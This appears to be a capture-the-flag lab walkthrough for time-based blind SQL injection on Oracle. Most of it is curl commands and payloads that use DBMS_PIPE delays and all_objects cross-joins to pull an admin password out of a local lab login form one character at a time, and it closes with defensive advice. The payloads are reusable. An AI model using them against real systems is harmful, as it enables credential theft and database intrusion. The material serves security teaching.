<h4>Step 1: Confirm True Blind Injection</h4>
<p>
    The login form gives the identical response regardless of query success or failure.
    No errors shown for execute-time failures, no content differences. Time is the only side channel.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Identical Responses</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab7" \<br> --data-urlencode "username=admin" --data-urlencode "password=test"<br>
        <span class="prompt">Username: </span>admin<br>
        <span class="prompt">Password: </span>test<br>
        <span class="prompt">SQL: </span>SELECT id FROM users WHERE username = 'admin' AND password = 'test' AND active = 1<br>
        <span class="prompt">Result: </span><strong>Login request processed.</strong><br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "username=' OR 1=1 -- " --data-urlencode "password=x"<br>
        <span class="prompt">Username: </span>' OR 1=1 -- <br>
        <span class="prompt">Result: </span><strong>Login request processed.</strong> (same response!)<br>
        <span class="prompt">// No behavioral difference -- true blind scenario</span>
    </div>
</div>

<h4>Step 2: Parse Errors Are Visible</h4>
<p>
    Note: syntax errors at parse time (like unclosed quotes) DO show Oracle errors.
    But execute-time errors are suppressed.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Parse vs Execute Errors</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "username='" --data-urlencode "password=x"<br>
        <span class="prompt">Username: </span>'<br>
        <span class="prompt">Result: </span><strong>ORA-01756: quoted string not properly terminated</strong> (parse error visible)<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "username=' OR 1=TO_NUMBER('abc') -- " --data-urlencode "password=x"<br>
        <span class="prompt">Username: </span>' OR 1=TO_NUMBER('abc') -- <br>
        <span class="prompt">Result: </span><strong>Login request processed.</strong> (execute error suppressed)<br>
        <span class="prompt">// Parse errors show, execute errors don't -- true blind for data extraction</span>
    </div>
</div>

<h4>Step 3: DBMS_PIPE.RECEIVE_MESSAGE Concept</h4>
<p>
    Oracle has no built-in <code>SLEEP()</code> function. <code>DBMS_PIPE.RECEIVE_MESSAGE('pipe', seconds)</code>
    waits for a message on a named pipe for the specified duration. Since no message arrives, it blocks
    for the full time: acting as a sleep.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. DBMS_PIPE Concept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Syntax:   </span>DBMS_PIPE.RECEIVE_MESSAGE('pipe_name', seconds)<br>
        <span class="prompt">Returns:  </span>1 (timeout, no message) after waiting<br>
        <span class="prompt">Requires: </span>EXECUTE privilege on DBMS_PIPE<br><br>
        <span class="prompt">Conditional:</span><br>
        <span class="prompt">True:  </span>CASE WHEN condition THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 0 END<br>
        <span class="prompt">Result:</span> 3-second delay when condition is TRUE, instant when FALSE<br><br>
        <span class="prompt">Note: </span>In Oracle XE with restricted privileges, DBMS_PIPE may not cause<br>
        a delay. Alternative: heavy query (SELECT COUNT(*) FROM all_objects,all_objects).
    </div>
</div>

<h4>Step 4: Heavy Query Alternative (Tested)</h4>
<p>
    When DBMS_PIPE isn't available, a computationally heavy cross-join creates measurable delay.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Heavy Query Timing</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s "..." --data-urlencode "username=admin" --data-urlencode "password=test" -o /dev/null<br>
        <span class="prompt">Baseline:  </span>~358ms<br><br>
        <span class="prompt">$ </span>time curl -s "..." \<br>
        &nbsp;&nbsp;--data-urlencode "username=admin' OR (SELECT COUNT(*) FROM all_objects,all_objects WHERE ROWNUM&lt;=50000 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='F')>0 -- " \<br>
        &nbsp;&nbsp;--data-urlencode "password=x" -o /dev/null<br>
        <span class="prompt">Result:    </span>~6131ms delay (condition TRUE -- first char IS 'F')<br><br>
        <span class="prompt">// Delay means condition is TRUE -- no delay means FALSE</span>
    </div>
</div>

<h4>Step 5: Time-Based Character Extraction (Verified)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Character Extraction Pattern</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Pattern: </span>admin' OR (SELECT COUNT(*) FROM all_objects a, all_objects b<br>
        &nbsp;&nbsp;WHERE ROWNUM&lt;=50000<br>
        &nbsp;&nbsp;AND SUBSTR((SELECT password FROM users WHERE username='admin'),N,1)='X')>0 -- <br><br>
        <span class="prompt">Pos 1:  </span>X='F' -> ~6131ms delay (TRUE)<br>
        <span class="prompt">Pos 2:  </span>X='L' -> ~6161ms delay (TRUE)<br>
        <span class="prompt">Pos 3:  </span>X='A' -> ~6091ms delay (TRUE)<br>
        <span class="prompt">Pos 4:  </span>X='G' -> ~6211ms delay (TRUE)<br>
        <span class="prompt">Pos 5:  </span>X='{' -> ~6179ms delay (TRUE)<br>
        <span class="prompt">...     </span>(continue for all characters)<br><br>
        <span class="prompt">Result: </span><strong>FLAG{or_dbms_p1p3_t1m3}</strong>
    </div>
</div>

<h4>Step 6: Oracle Time Delay Alternatives</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Time Delay Functions</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">DBMS_PIPE:    </span>DBMS_PIPE.RECEIVE_MESSAGE('x', N) -- requires EXECUTE priv<br>
        <span class="prompt">DBMS_LOCK:    </span>DBMS_LOCK.SLEEP(N) -- PL/SQL only, requires priv<br>
        <span class="prompt">DBMS_SESSION: </span>DBMS_SESSION.SLEEP(N) -- Oracle 18c+<br>
        <span class="prompt">Heavy Query:  </span>SELECT COUNT(*) FROM all_objects,all_objects -- no priv needed<br>
        <span class="prompt">UTL_HTTP:     </span>UTL_HTTP.REQUEST('http://slow') -- requires ACL<br><br>
        <span class="prompt">// Note: DBMS_PIPE works in SQL context (SELECT), while DBMS_LOCK</span><br>
        <span class="prompt">// and DBMS_SESSION only work in PL/SQL blocks.</span>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_dbms_p1p3_t1m3}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle has no <code>SLEEP()</code> function. Time-based blind injection uses
    <code>DBMS_PIPE.RECEIVE_MESSAGE('pipe', seconds)</code> which blocks waiting for a pipe message.
    When DBMS_PIPE privileges aren't available, computationally heavy cross-joins (cartesian products of
    <code>all_objects</code>) create measurable delays. Combine with <code>CASE WHEN</code> and
    <code>SUBSTR()</code> for character-by-character extraction. Defense: use bind variables, implement
    query timeouts, and revoke privileges on DBMS packages.
</div>
